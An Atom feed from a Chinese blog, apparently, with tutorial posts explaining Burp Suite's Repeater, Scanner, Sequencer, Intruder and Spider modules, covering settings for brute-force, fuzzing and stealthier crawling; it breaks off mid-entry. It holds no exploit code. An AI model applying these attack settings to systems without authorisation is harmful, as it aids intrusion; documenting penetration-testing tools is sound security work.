<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Archimesan</title>
  
  <subtitle>思而不学则殆！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://archimesan.me/"/>
  <updated>2019-03-26T09:17:41.199Z</updated>
  <id>http://archimesan.me/</id>
  
  <author>
    <name>Archimesan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BurpSuite系列之Repeater模块</title>
    <link href="http://archimesan.me/2019/03/26/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BRepeater%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2019/03/26/BurpSuite系列之Repeater模块/</id>
    <published>2019-03-26T09:14:43.000Z</published>
    <updated>2019-03-26T09:17:41.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Repeater模块(中继器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Repeater 是一个手动修改并补发个别 HTTP 请求，并分析他们的响应的工具。它最大的用途就是和其他 Burp Suite 工具结合起来。你可以从目标站点地图，从 Burp Proxy 浏览记录，或者从 Burp Intruder 攻击结果上的请求，发送到 Repeater 上，并手动调整这个请求来微调对漏洞的探测或攻击。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Repeater模块/20190326051636510.png" alt><br>1.可以从Proxy history、site map、Scanner等模块中右键菜单send to repeater发送到repeater，对页面数据进行修改发送。<br>2.点击go，发送请求，右边响应请求。<br>3.可以通过“&lt;“和”&gt;“来返回上一次和下一个操作。<br>4.单击”x“可以删除当前测试请求页面。<br>5.底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数。<br>raw — 这显示纯文本格式的消息。在文本面板的底部有一个搜索和加亮的功能，可以用来快速地定位出消息里的感兴趣的字符串，如出错消息。搜索栏左边的弹出项让你能控制状况的灵敏度，以及是否使用简单文本或者十六进制搜索。<br>params — 对于包含参数(URL 查询字符串，cookie 头，或者消息体)的请求，这个选项把这些参数分析为名字/值的格式，这就可以简单地随他们进行查看和修改了。<br>headers — 这里是以名字/值的格式来显示 HTTP 的消息头，并且也以原始格式显示了消息体。<br>hex — 这里允许你直接编辑由原始二进制数据组成的消息。如果在文本编辑器修改，某种类型的传输(如，MIME 编码的浏览器请求)包含了可能损坏的二进制内容。为了修改这类消息，应该使用十六进制编辑器。<br>该模块的设置在菜单栏 Repeater中，主要选项如下：<br><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Repeater模块/20190326051718288.png" alt><br>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之Repeater模块(中继器)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Scanner模块</title>
    <link href="http://archimesan.me/2019/03/26/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BScanner%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2019/03/26/BurpSuite系列之Scanner模块/</id>
    <published>2019-03-26T08:49:50.000Z</published>
    <updated>2019-03-26T09:18:16.917Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Scanner模块(漏洞扫描)<br><a id="more"></a></p><p>一、简介<br>Burp Scanner 是一个进行自动发现 web 应用程序的安全漏洞的工具。它是为渗透测试人员设计的，并且它和你现有的手动执行进行的 web 应用程序半自动渗透测试的技术方法很相似。<br>使用的大多数的 web 扫描器都是单独运行的：你提供了一个开始 URL，单击‖go‖,然后注视着进度条的更新直到扫描结束，最后产生一个报告。Burp Scanner 和这完全不同，在攻击一个应用程序时它和你执行的操作紧紧的结合在一起。让你细微控制着每一个扫描的请求，并直接反馈回结果。<br>Burp Scanner 可以执行两种扫描类型：主动扫描(Active scanning)，被动扫描(Passive scanning)。<br>二、模块说明<br>1：Issue activity</p><p> <img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045400722.png" alt><br>2：Scan queue  扫描队列，这里将显示扫描队列的状态 进度 结果等。<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045411253.png" alt></p><p>主要包含以下内容：</p><ol><li>索引号的项目，反映该项目的添加顺序。</li><li>目的地协议，主机和URL 。</li><li>该项目的当前状态，包括完成百分比。</li><li>项目扫描问题的数量（这是根据所附的最严重问题的重要性和彩色化） 。</li><li>在扫描项目的请求数量进行。</li><li>网络错误的数目遇到的问题。</li><li>为项目创建的插入点的数量。</li></ol><p>3：Live scanning<br>实时扫描可让您决定哪些内容通过使用浏览器的目标应用，通过BurpProxy服务器进行扫描。您可以实时主动扫描设定live active scanning(积极扫描)和live passive（被动扫描）两种扫描模式。<br>Live Active Scanning：积极扫描。当浏览时自动发送漏洞利用代码。<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045424075.png" alt></p><p>Live Passive Scanning：被动扫描。只分析流量不发送任何请求。<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045429074.png" alt></p><p>3：Issue Definitions<br>漏洞列表，列出了burp可以扫描到的漏洞详情<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045434255.png" alt></p><p>4：Options<br>包含Burp扫描选项进行攻击的插入点，主动扫描引擎，主动扫描优化，主动扫描区和被动扫描区域。<br>1：Attack Insertion Points<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045439303.png" alt></p><p>2：Active Scanning Engine<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045445120.png" alt></p><p>3：Active Scanning Optimization<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045448834.png" alt></p><p>4：Active Scanning Areas<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045454641.png" alt></p><p>5：Passive Scanning Areas<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045458043.png" alt></p><p>6：Static Code Analysis<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164950/20190326045504023.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之Scanner模块(漏洞扫描)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Sequencer模块</title>
    <link href="http://archimesan.me/2018/04/02/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSequencer%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/04/02/BurpSuite系列之Sequencer模块/</id>
    <published>2018-04-02T09:19:20.000Z</published>
    <updated>2019-03-26T09:24:33.598Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Sequencer模块(定序器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Sequencer是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>Burp Sequencer主要由三个模块组成:</p><p>1：Live capture 信息截取<br>2：Manual load 手动加载<br>3：Analysis options 选项分析</p><h2 id="Live-capture-信息截取"><a href="#Live-capture-信息截取" class="headerlink" title="Live capture 信息截取"></a>Live capture 信息截取</h2><p>选项1：Select Live Capture Request</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052051786.png" alt></p><p>选项2：Token Location Within Response</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052109249.png" alt></p><p>选项3：Live Capture Options</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052123554.png" alt></p><h2 id="Manual-load-手动加载"><a href="#Manual-load-手动加载" class="headerlink" title="Manual load 手动加载"></a>Manual load 手动加载</h2><p>选项1：Manual Load</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052159788.png" alt></p><h2 id="Analysis-options-选项分析"><a href="#Analysis-options-选项分析" class="headerlink" title="Analysis options 选项分析"></a>Analysis options 选项分析</h2><p>选项1：Token Handling  令牌处理</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052218850.png" alt></p><p>选项2：Token Analysis  令牌分析</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052227473.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之Sequencer模块(定序器)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite系列之Intruder模块</title>
    <link href="http://archimesan.me/2018/03/28/Burpsuite%E7%B3%BB%E5%88%97%E4%B9%8BIntruder%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/03/28/Burpsuite系列之Intruder模块/</id>
    <published>2018-03-28T08:56:20.000Z</published>
    <updated>2019-03-26T09:18:06.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Burpsuite系列之Intruder模块（暴力破解）<br><a id="more"></a></p><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。</p><h1 id="二、模块说明"><a href="#二、模块说明" class="headerlink" title="二、模块说明"></a>二、模块说明</h1><p>Burp Intruder主要有四个模块组成:</p><p>1：Target 用于配置目标服务器进行攻击的详细信息。<br>2：Positions  设置Payloads的插入点以及攻击类型（攻击模式）。<br>3：Payloads  设置payload，配置字典<br>4：Opetions   此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p><h2 id="Target-目标选项-Target-tab"><a href="#Target-目标选项-Target-tab" class="headerlink" title="Target 目标选项(Target tab)"></a>Target 目标选项(Target tab)</h2><p>这个选项是用来配置目标服务器的细节：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326045934997.png" alt></p><h2 id="Positions-位置选项-Positions-tab"><a href="#Positions-位置选项-Positions-tab" class="headerlink" title="Positions 位置选项(Positions tab)"></a>Positions 位置选项(Positions tab)</h2><p>这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326045943778.png" alt><br>使用一对§字符来标记出有效负荷的位置，在这两个符号直接包含了模板文本的内容。当把一个有效负荷放置到一个给出的请求的特殊位置上时，就把这§符号放到这个位置，然后在两个符号之间的出现的文本都会被有效负荷替换。当有个特殊位置没有为一个给出的请求安排有效负荷时(这只适用”sniper”攻击类型)，那个位置的§字符会被删除，出现在它们之间的文本不会变化。</p><p>当使用 Burp Suite 发送一个其他地方的请求时，Burp Intruder 会对你最想放置有效负荷的位置做一个最好的猜测，并且它把这些放置在每个 URL 和主体参数的值里，以及每个cookie 里。每个标记和它中间的文本都会被加亮以显得更清晰。你可以使用 Intruder 菜单上的选项标记的位置是要替换还是附加现有的参数值。在上面的请求编辑器里，指出了定义位置的数量和文本模板的大小。<br>你可以使用选项上的按钮来控制位置上的标记：</p><h4 id="add-§-—-在当前光标位置插入一个位置标记。"><a href="#add-§-—-在当前光标位置插入一个位置标记。" class="headerlink" title="add § — 在当前光标位置插入一个位置标记。"></a>add § — 在当前光标位置插入一个位置标记。</h4><h3 id="clear-§-—-删除整个模板或选中的部分模板里的位置标记。"><a href="#clear-§-—-删除整个模板或选中的部分模板里的位置标记。" class="headerlink" title="clear § — 删除整个模板或选中的部分模板里的位置标记。"></a>clear § — 删除整个模板或选中的部分模板里的位置标记。</h3><h3 id="auto-§-—-这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞-SQL-注入-快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。"><a href="#auto-§-—-这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞-SQL-注入-快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。" class="headerlink" title="auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。"></a>auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。</h3><h3 id="refresh-—-如果需要，可以刷新编辑器里有颜色的代码。"><a href="#refresh-—-如果需要，可以刷新编辑器里有颜色的代码。" class="headerlink" title="refresh — 如果需要，可以刷新编辑器里有颜色的代码。"></a>refresh — 如果需要，可以刷新编辑器里有颜色的代码。</h3><h3 id="clear-—-删除整个编辑器内容。"><a href="#clear-—-删除整个编辑器内容。" class="headerlink" title="clear — 删除整个编辑器内容。"></a>clear — 删除整个编辑器内容。</h3><h2 id="Payloads-有效负荷选项-Payloads-tab"><a href="#Payloads-有效负荷选项-Payloads-tab" class="headerlink" title="Payloads 有效负荷选项(Payloads tab)"></a>Payloads 有效负荷选项(Payloads tab)</h2><p>这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。<br>选项1：Payload Sets Payload数量类型设置<br>选项2：Payload Opetions[Simple list]  该选项会根据选项1中Payload type的设置而改变<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050105567.png" alt></p><p>选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050110646.png" alt></p><p>选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050118376.png" alt></p><h2 id="Opetions-选项卡-Options-tab"><a href="#Opetions-选项卡-Options-tab" class="headerlink" title="Opetions  选项卡(Options tab)"></a>Opetions  选项卡(Options tab)</h2><p>此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。<br>选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。</p><p>如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。</p><p>如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。</p><p>如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。<br>选项2：Request Engine 设置发送请求的线程、超时重试等。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050127313.png" alt></p><p>选项3：Attack Results 设置攻击结果的显示。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050133518.png" alt></p><p>选项4：Grep – Match 在响应中找出存在指定的内容的一项。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050138437.png" alt></p><p>选项5：Grep – Extract 通过正则提取返回信息中的内容。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050144205.png" alt></p><p>选项6：Grep – Payloads  这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050150284.png" alt></p><p>选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050203273.png" alt></p><h1 id="Burp-Suite-Intruder的4种攻击类型"><a href="#Burp-Suite-Intruder的4种攻击类型" class="headerlink" title="Burp Suite Intruder的4种攻击类型"></a>Burp Suite Intruder的4种攻击类型</h1><h2 id="Sniper（狙击手模式）"><a href="#Sniper（狙击手模式）" class="headerlink" title="Sniper（狙击手模式）"></a>Sniper（狙击手模式）</h2><p>狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“1”和“2”，那么它攻击会形成以下组合（除原始数据外）：<img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/attack NO.location Alocation B11no replace22no replace3no replace14no replace2二Battering ram（.png" alt="attack NO.location Alocation B11no replace22no replace3no replace14no replace2"></p><h2 id="Battering-ram（攻城锤模式）"><a href="#Battering-ram（攻城锤模式）" class="headerlink" title="Battering ram（攻城锤模式）"></a>Battering ram（攻城锤模式）</h2><p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。<img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/attack NO.location Alocation B111222.png" alt="attack NO.location Alocation B111222"></p><h2 id="Pitchfork（草叉模式）"><a href="#Pitchfork（草叉模式）" class="headerlink" title="Pitchfork（草叉模式）"></a>Pitchfork（草叉模式）</h2><p>草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，则攻击模式如下：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326051341304.png" alt></p><h2 id="Cluster-bomb（集束炸弹模式）"><a href="#Cluster-bomb（集束炸弹模式）" class="headerlink" title="Cluster bomb（集束炸弹模式）"></a>Cluster bomb（集束炸弹模式）</h2><p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326051412843.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;Burpsuite系列之Intruder模块（暴力破解）&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite之Spider模块</title>
    <link href="http://archimesan.me/2018/03/26/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSpider%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/03/26/BurpSuite系列之Spider模块/</id>
    <published>2018-03-26T08:40:00.000Z</published>
    <updated>2019-03-26T09:18:38.088Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite之Spider模块(蜘蛛爬行)</p><a id="more"></a><p>一、简介<br>Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。<br>Burp Spider 通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序视图。<br>Burp Spider 能使你清楚地了解到一个 web 应用程序是怎样工作的，让你避免进行大量的手动任务而浪费时间，在跟踪链接，提交表单，精简 HTNL 源代码。可以快速地确人应用程序的潜在的脆弱功能，还允许你指定特定的漏洞，如 SQL 注入，路径遍历。<br>二、模块介绍<br>要对应用程序使用 Burp Spider 需要两个简单的步骤：<br>1.使用 Burp Proxy 配置为你浏览器的代理服务器，浏览目标应用程序(为了节省时间，你可以关闭代理拦截)。</p><p>2.到站点地图的”arget”选项上，选中目标应用程序驻留的主机和目录。选择上下文菜单的”<br>spider this host/branc”选项。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044124622.png" alt></p><p>选项一、Contro<br>用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围。<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044209596.png" alt><br>选项二、Options<br>这个选项里包含了许多控制 Burp Spider 动作的选项。<br>1：Crawler Settings<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044216519.png" alt><br>● check robots.txt：检测robot.txt文件。选择后Burp Spider会要求和处理robots.txt文件，提取内容链接。<br>● Detect custom “not found” responese：检测自定义的’not found’响应。打开后Burp Spider会从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测自定义“not found”的响应。<br>● ignore links to non-text content：忽略非文本内容的连接。这个选项被选中，Spider 不会请求非文本资源。使用这个选项，会减少 spidering 时间。<br>● request the root of all directories：请求所有的根目录。如果这个选项被选中，Burp Spider 会请求所有已确认的目标范围内的 web 目录，如果在这个目标站点存在目录遍历， 这选项将是非常的有用。<br>● make a non-parameterized request to each dynamic page：对每个动态页面进行非参数化的请求。如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出额外的站点内容和功能。<br>● Maximum link depth：这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。<br>● Maximum parameterized requests per URL：请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容。<br>2：Passive Spidering<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044225919.png" alt><br>● Passively spider as you browse:如果这个选项被选中，Burp Suite 会被动地处理所有通过 Burp Proxy 的 HTTP 请求，来确认访问页面上的链接和表格。使用这个选项能让 Burp Spider 建立一个包含应用程序内容的详细画面，甚至此时你仅仅使用浏览器浏览了内容的一个子集，因为所有被访问内容链接到内容都会自动地添加到 Suite 的站点地图上。<br>● link depth to associate with proxy requests:这个选项控制着与通过 Burp Proxy 访问的 web 页面 有关的” link depth”。为了防止 Burp Spider 跟踪这个页面里的所有链接，要设置一个比上面 选项卡里的” maximum link depth”值还高的一个值。<br>3：Form Submission<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044233259.png" alt><br>● individuate forms：个性化的形式。这个选项是配置个性化的标准(执行 URL，方法，区域，值)。当 Burp Spider 处理这些表格时，它会检查这些标准以确认表格是否是新的。旧的表格不会加入到提交序列。<br>● Don’t submit：开启后蜘蛛不会提交任何表单。<br>● prompt for guidance：提醒向导。如果被选中，在你提交每一个确认的表单前，Burp Suite 都会为你指示引导。这允许你根据需要在输入域中填写自定义的数据，以及选项提交到服务器的哪一个区域。<br>● automatically submit：自动提交。如果选中，Burp Spider 通过使用定义的规则来填写输入域的文本值来自动地提交范围内的表单。每一条规则让你指定一个简单的文本或者正则表达式来匹配表单字段名，并提交那些表单名匹配的字段值。<br>● set unmatched fields to：设置不匹配的字段。<br>4：application login<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044239593.png" alt><br>● don’t submit login forms：不提交登录表单。开启后burp不会提交登录表单。<br>● prompt for guidance：提示向导。Burp能交互地为你提示引导。默认设置项。<br>● handle as ordinary forms：以一般形式处理。Burp 通过你配置的信息和自动填充规则，用处理其他表单的方式来处理登陆表单。<br>● automatically submit these credentials：自动提交自定义的数据。开启后burp遇到登录表单会按照设定的值进行提交。<br>5：Spider Engine<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044246271.png" alt><br>● Number of threads – 设置请求线程。控制并发请求数。<br>● Number of retries on network failure – 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。<br>● Pause before retry – 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。<br>● Throttle between requests：在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。<br>● Add random variations to throttle：添加随机的变化到请求中。增加隐蔽性。<br>6：Request Headers<br><img src="http://poysl5u4h.bkt.clouddn.com/20190326164000/20190326044253928.png" alt><br>您可以配置头蜘蛛在请求中使用的自定义列表。这可能是有用的，以满足各个应用程序的特定要求 – 例如，测试设计用于移动设备的应用程序时，以模拟预期的用户代理。</p><p>● Use HTTP version 1.1 ：在蜘蛛请求中使用HTTP/1.1，不选中则使用HTTP/1.0.<br>● Use Referer header：当从一个页面访问另一个页面是加入Referer头，这将更加相似与浏览器访问。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
